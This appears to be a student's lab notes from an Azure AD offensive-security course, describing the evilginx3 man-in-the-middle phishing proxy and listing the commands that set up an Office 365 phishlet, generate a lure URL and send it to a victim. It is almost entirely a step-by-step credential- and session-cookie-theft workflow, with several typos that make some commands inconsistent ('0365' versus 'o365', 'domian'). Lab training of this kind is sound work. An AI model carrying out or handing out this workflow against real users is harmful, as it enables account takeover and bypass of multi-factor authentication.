
- we can use `evilginnx3` for phising attacks. 
- evilginx3 acts as a rely/man-in-middle attack between legit web pages and a target user. the user always interacts with the legit website and evilgnix captures usernames, passwords and authentication cookies. 
- it uses phishlets that are configuration files for specific target hosts, filter, structure, of authentication cookies and credentials.

Evilginx3 is setup already in VMs

Start evilginx3
`evilginx3 -p C:\AzAD\Tools\evilginx-3.3.0\phishlets -developer`

Configure Domain 
` config domian student<x>.corp`

Set IP for evilginx server: 
` config ipv4 external 172.16.x.x`

Use template for Office 365
` phishlets hostname o365 student<x>.corp`

Verify the DNS Server:
`phishlets get-hosts 0365`

Enable phishlets 
`phishlets enable o365`

Create the Phishing URL: (Tied to an ID)
`lures create 0365`

Get Phishing URL
`lures get-url <ID>`

Share the URL with the victim(for lab send an emnail using your registered email)


